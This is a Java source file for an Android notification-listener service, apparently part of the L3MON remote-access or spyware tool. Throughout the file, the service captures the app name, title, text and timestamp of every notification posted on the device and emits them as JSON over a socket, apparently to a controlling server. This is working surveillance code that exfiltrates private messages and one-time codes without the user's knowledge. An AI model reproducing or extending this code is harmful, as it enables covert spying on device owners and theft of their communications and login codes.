package com.etechd.l3mon.notifications;

import android.app.Notification;
import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.etechd.l3mon.core.network.SocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class NotificationRelayService extends NotificationListenerService {

    private static final String TAG = "NotificationRelay";

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;

        try {
            String appName = sbn.getPackageName();
            String title = "";
            String content = "";

            Notification notification = sbn.getNotification();
            if (notification.extras != null) {
                title = notification.extras.getString(Notification.EXTRA_TITLE, "");
                CharSequence contentCs = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
                content = contentCs != null ? contentCs.toString() : "";
            }

            long postTime = sbn.getPostTime();
            String uniqueKey = sbn.getKey();

            JSONObject data = new JSONObject();
            data.put("appName", appName);
            data.put("title", title);
            data.put("content", content);
            data.put("postTime", postTime);
            data.put("key", uniqueKey);

            SocketClient.getInstance().getSocket().emit("0xNO", data);

        } catch (JSONException e) {
            Log.e(TAG, "Notification JSON error", e);
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error in onNotificationPosted", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
    }
}
